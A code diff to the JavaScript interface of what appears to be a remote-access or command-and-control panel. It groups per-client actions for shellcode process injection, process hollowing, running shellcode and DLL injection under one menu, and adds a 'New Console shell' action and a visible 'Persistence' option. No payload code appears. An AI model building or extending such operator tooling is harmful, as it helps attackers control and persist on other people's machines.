@@ -5,7 +5,8 @@ import {
     PasswordOption, 
     SendInjectShellCodeLocal,
     UploadProcessToInject,
-    HollowingOptionHandler
+    HollowingOptionHandler,
+    sendMsgToFlsk
 } from './OptionSettings.js';
   
 
@@ -265,17 +266,31 @@ function DisplaySettings(clientDiv, id) {
         }
       ]
     },
-    { 
-      name: "Inject Process", 
-      action: (e) => InjectOption(e, id) 
+    {
+      name: "Injection", 
+      action: null,
+      subOptions:[
+        { 
+          name: "Inject Process", 
+          action: (e) => InjectOption(e, id, "SHELLCODE") 
+        },
+        {
+          name: "Process Hollowing",
+          action: () => hollowinghandler.initialize()
+        },
+        { 
+          name: "Run shell code", 
+          action: () => SendInjectShellCodeLocal(UploadProcessToInject, id) 
+        },
+        {
+          name: "Dll Injection",
+          action: (e) => InjectOption(e, id, "DLL")
+        }
+      ]
     },
     {
-      name: "Process Hollowing",
-      action: () => hollowinghandler.initialize()
-    },
-    { 
-      name: "Run shell code", 
-      action: () => SendInjectShellCodeLocal(UploadProcessToInject, id) 
+      name: "New Console shell",
+      action: () => sendMsgToFlsk("0x2737538258278", id)
     },
     { 
       name: "Persistence", 
